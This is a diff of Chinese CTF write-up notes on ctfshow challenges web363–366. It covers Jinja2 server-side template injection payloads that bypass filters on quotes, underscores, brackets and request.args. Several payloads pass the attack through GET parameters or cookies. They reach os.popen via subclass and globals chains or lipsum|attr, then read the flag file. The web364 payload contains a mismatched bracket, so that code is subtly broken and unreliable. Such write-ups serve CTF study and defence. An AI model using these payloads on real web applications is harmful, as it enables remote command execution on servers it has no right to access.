@@ -96,9 +96,26 @@ __bases__[0]
 {% set a=(()|select|string|list).pop(24)%}{%print(a)%}
 2、可以通过十六进制编码的方式进行绕过，举个例子
 {{()["\x5f\x5fclass\x5f\x5f"]}} ={{().__class__}}
+3.利用过滤器
+filters中的attr来过滤下划
+?name={{(lipsum | attr(request.values.b)).os.popen(request.values.a).read()}}&a=cat /flag&b=__globals__
+```
+
+`[]`被ban
+
+```
+__getitem__()
 ```
 
 
+
+### 单双引号被ban
+
+采用传递参数的方法：
+
+- `request.args.参数名`
+- `request.cookies.参数名`
+- `request.values.参数名`
 
 ---
 
@@ -133,14 +150,45 @@ __bases__[0]
 
 ### web363
 
+> 过滤了单双引号
+
+这里采用传get参数的方法，通过传参数绕过单双引号
+
+```python
+?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.popen](request.args.bx).read()}}&popen=popen&bx=cat /flag
+```
 
 
 
+### web364
+
+> 单双引号，args这个也ban了
+
+```python
+?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.cookies.b]([request.cookies.x).read()}}
+
+#cookie中添加
+b=popen&x=cat /flag
+```
 
 
 
+### web365
+
+> 单双引号，args ,   [] 被ban
+
+```python
+?name={{().__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()}}&a=popen&b=cat /flag
+```
 
 
-> 参考文章：
->
-> 
+
+### web366
+
+> 单双引号，和下划线被ban
+
+```python
+?name={{(lipsum | attr(request.values.b)).os.popen(request.values.a).read()}}&a=cat /flag&b=__globals__
+```
+
+利用filters中的attr来过滤下划
